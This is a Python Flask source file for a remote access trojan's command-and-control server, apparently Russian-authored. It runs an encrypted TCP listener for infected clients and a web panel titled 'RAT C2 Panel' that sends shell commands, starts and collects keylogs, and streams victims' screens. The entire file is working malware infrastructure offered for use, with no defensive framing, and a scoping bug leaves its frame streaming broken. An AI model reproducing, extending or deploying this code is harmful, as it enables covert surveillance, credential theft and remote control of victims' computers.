from flask import Flask, render_template_string, request, jsonify, Response
import socket
import threading
import json
import time
import base64
import os
import hashlib
import struct
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

app = Flask(__name__)

TCP_PORT = int(os.environ.get("PORT", 10000))
clients = {}
client_counter = 0
pending_results = {}
cmd_counter = 0
last_frame = None

KEY = hashlib.sha256(b"MY_SECRET_KEY_CHANGE_ME_123!@#").digest()

def encrypt(plaintext: bytes) -> bytes:
    cipher = ChaCha20Poly1305(KEY)
    nonce = os.urandom(12)
    ct = cipher.encrypt(nonce, plaintext, None)
    return nonce + ct

def decrypt(packet: bytes) -> bytes:
    cipher = ChaCha20Poly1305(KEY)
    nonce = packet[:12]
    ct = packet[12:]
    return cipher.decrypt(nonce, ct, None)

class ClientHandler:
    def __init__(self, client_id, sock, addr):
        self.id = client_id
        self.sock = sock
        self.addr = addr
        self.buffer = b""
        self.running = True
    
    def handle(self):
        while self.running:
            try:
                data = self.sock.recv(65536)
                if not data:
                    break
                
                decrypted = decrypt(data)
                msg = json.loads(decrypted.decode())
                
                if msg.get("type") == "stream_frame":
                    last_frame = base64.b64decode(msg["data"])
                elif "id" in msg and "result" in msg:
                    pending_results[msg["id"]] = msg["result"]
            except:
                break
        self.running = False
        if self.id in clients:
            del clients[self.id]
    
    def send(self, data: bytes):
        try:
            self.sock.send(encrypt(data))
        except:
            self.running = False

def tcp_server():
    global client_counter
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", TCP_PORT))
    server.listen(5)
    print(f"[TCP] Listening on port {TCP_PORT}")
    
    while True:
        sock, addr = server.accept()
        client_counter += 1
        cid = client_counter
        print(f"[TCP] Client {cid} connected from {addr}")
        handler = ClientHandler(cid, sock, addr)
        clients[cid] = handler
        threading.Thread(target=handler.handle, daemon=True).start()

HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAT C2 Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0f; color: #c8c8d0; font-family: 'Courier New', monospace; padding: 20px; }
        h1 { color: #00ff88; text-align: center; margin-bottom: 20px; }
        .panel { display: flex; gap: 20px; flex-wrap: wrap; }
        .left { flex: 1; min-width: 300px; background: #12121a; border: 1px solid #252535; border-radius: 8px; padding: 15px; }
        .right { flex: 1; min-width: 300px; background: #12121a; border: 1px solid #252535; border-radius: 8px; padding: 15px; }
        .output { background: #0a0a0f; border: 1px solid #252535; border-radius: 4px; padding: 10px; height: 400px; overflow-y: auto; white-space: pre-wrap; font-size: 12px; margin-top: 10px; }
        input, select { width: 100%; padding: 10px; background: #0a0a0f; border: 1px solid #252535; color: #fff; border-radius: 4px; margin-bottom: 10px; font-family: 'Courier New', monospace; }
        button { padding: 10px 20px; background: #00ff88; color: #000; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-right: 5px; }
        button:hover { background: #00cc6a; }
        .btn-sm { padding: 5px 10px; font-size: 12px; background: #252535; color: #c8c8d0; }
        .stream-img { max-width: 100%; margin-top: 10px; border-radius: 4px; border: 1px solid #252535; }
    </style>
</head>
<body>
    <h1>🛡️ RAT C2 Panel</h1>
    <div class="panel">
        <div class="left">
            <h3>💻 Команды</h3>
            <select id="clientSelect"><option value="0">Выбери клиента</option></select>
            <input type="text" id="cmd" placeholder="whoami">
            <button onclick="sendCmd()">▶ Execute</button>
            <button class="btn-sm" onclick="quick('whoami')">whoami</button>
            <button class="btn-sm" onclick="quick('ls C:\\')">ls C:\</button>
            <button class="btn-sm" onclick="quick('screen')">screen</button>
            <button class="btn-sm" onclick="quick('ip')">ip</button>
            <button class="btn-sm" onclick="quick('keylog')">keylog</button>
            <button class="btn-sm" onclick="quick('keylogget')">get logs</button>
            <div class="output" id="output">[Ожидание команд...]</div>
        </div>
        <div class="right">
            <h3>📺 Стрим</h3>
            <button id="streamBtn" onclick="toggleStream()">▶ Start Stream</button>
            <img class="stream-img" id="streamImg" src="" style="display:none;">
        </div>
    </div>

    <script>
        setInterval(async () => {
            try {
                const r = await fetch('/api/clients');
                const data = await r.json();
                const sel = document.getElementById('clientSelect');
                sel.innerHTML = data.clients.map(id => `<option value="${id}">Client ${id}</option>`).join('');
                if (data.clients.length === 0) sel.innerHTML = '<option value="0">Нет клиентов</option>';
            } catch(e) {}
        }, 3000);
        
        async function sendCmd() {
            const cid = document.getElementById('clientSelect').value;
            const cmd = document.getElementById('cmd').value;
            if (!cmd || cid === '0') return;
            const out = document.getElementById('output');
            out.innerHTML += '> ' + cmd + '\n';
            try {
                const r = await fetch(`/api/cmd?cid=${cid}&text=${encodeURIComponent(cmd)}`);
                const data = await r.json();
                out.innerHTML += data.result + '\n';
                out.scrollTop = out.scrollHeight;
            } catch(e) {
                out.innerHTML += '[Ошибка]\n';
            }
        }
        
        function quick(cmd) {
            document.getElementById('cmd').value = cmd;
            sendCmd();
        }
        
        let streamInterval = null;
        function toggleStream() {
            const btn = document.getElementById('streamBtn');
            if (streamInterval) {
                clearInterval(streamInterval); streamInterval = null;
                btn.textContent = '▶ Start Stream';
                sendStreamCmd('streamstop');
            } else {
                streamInterval = setInterval(() => {
                    document.getElementById('streamImg').src = '/stream?t=' + Date.now();
                    document.getElementById('streamImg').style.display = 'block';
                }, 500);
                btn.textContent = '⏹ Stop Stream';
                sendStreamCmd('stream');
            }
        }
        
        async function sendStreamCmd(cmd) {
            const cid = document.getElementById('clientSelect').value;
            if (cid === '0') return;
            fetch(`/api/cmd?cid=${cid}&text=${cmd}`);
        }
        
        document.getElementById('cmd').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') sendCmd();
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/clients')
def api_clients():
    return jsonify({"clients": list(clients.keys())})

@app.route('/api/cmd')
def api_cmd():
    global cmd_counter, pending_results
    cid = int(request.args.get('cid', 0))
    text = request.args.get('text', '')
    
    if cid not in clients:
        return jsonify({"result": "Клиент не найден"})
    
    cmd_counter += 1
    cmd_id = cmd_counter
    msg = json.dumps({"id": cmd_id, "cmd": text}).encode()
    clients[cid].send(msg)
    
    for _ in range(60):
        time.sleep(0.5)
        if cmd_id in pending_results:
            result = pending_results.pop(cmd_id)
            return jsonify({"result": result})
    return jsonify({"result": "⏰ Timeout"})

@app.route('/stream')
def stream():
    global last_frame
    if last_frame:
        return Response(last_frame, mimetype='image/jpeg')
    return '', 204

if __name__ == "__main__":
    threading.Thread(target=tcp_server, daemon=True).start()
    app.run(host="0.0.0.0", port=8080)